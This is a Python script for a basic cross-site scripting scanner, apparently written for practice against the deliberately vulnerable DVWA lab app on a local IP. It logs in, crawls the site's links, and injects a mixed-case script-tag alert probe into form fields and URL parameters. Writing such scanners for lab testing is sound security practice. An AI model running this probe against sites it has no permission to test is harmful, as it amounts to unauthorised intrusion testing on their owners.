import requests
import re
from urllib.parse import urljoin
from bs4 import BeautifulSoup

session = requests.Session()
target_url = 'http://192.168.56.102/dvwa/'
target_links = []
links_to_ignore = ['http://192.168.56.102/dvwa/logout.php/']
data_dict = {'username':'user', 'password':'user', 'Login':'submit'}
session.post('http://192.168.56.102/dvwa/login.php', data = data_dict)

def extract_links_from( url):
    response = session.get(url)
    decoded_response_content = response.content
    decoded_response_content = decoded_response_content.decode('ISO-8859-1')
    return re.findall('(?:href=")(.*?)"', decoded_response_content)

def crawl(url):
    url =target_url
    href_links = extract_links_from(url)
    for link in href_links:
        link = urljoin(url, link)
        if '#' in link:
            link = link.split('#')[0]
        if target_url in link and link not in target_links and link not in links_to_ignore:
            target_links.append(link)
            print(link)
            crawl(link)

def extract_forms(url):
    response = session.get(url)
    parsed_html = BeautifulSoup(response.content, 'html.parser')
    return parsed_html.findAll('form')

def submit_form(form, value, url):
    action = form.get('action')
    post_url = urljoin(url, action)
    method = form.get('method')
    inputs_list = form.findAll('input')
    post_data = {}
    for input_ in inputs_list:
        input_name = input_.get('name')
        input_type = input_.get('type')
        input_value = input_.get('value')
        if input_type == 'text':
            input_value = value
        post_data[input_name] = input_value

    if method == 'post':
        return session.post(post_url, data=post_data)
    return session.get(post_url, params=post_data)

def test_xss_in_form(form, url):
    xss_test_script = '<sCript>alert("test")</scriPt>'
    response = submit_form(form, xss_test_script, url)
    decoded_response_content = response.content
    decoded_response_content = decoded_response_content.decode('ISO-8859-1')
    if xss_test_script in decoded_response_content:
        return True
    else:
        return False

def test_xss_in_link(url):
    xss_test_script = '<sCript>alert("test")</scriPt>'
    url = url.replace('=','=' + xss_test_script)
    response = session.get(url)
    decoded_response_content = response.content
    decoded_response_content = decoded_response_content.decode('ISO-8859-1')
    if xss_test_script in decoded_response_content:
        return True
    else:
        return False

def run_scanner():
    for link in target_links:
        forms = extract_forms(link)

        for form in forms:
            print('[+] Testing form in ' + link)
            form_is_vulnerable_to_xss = test_xss_in_form(form, link)

            if form_is_vulnerable_to_xss == True:
                print("\n\n[***]XSS discovered in" + link + "in the following form")
                print(form)

        if '=' in link:
            print('\n\n[+] Testing' + link)
            link_is_vulnerable_to_xss = test_xss_in_link(link)

            if link_is_vulnerable_to_xss == True:
                print("[***]XSS discovered in" + link)


crawl(target_url)
run_scanner()
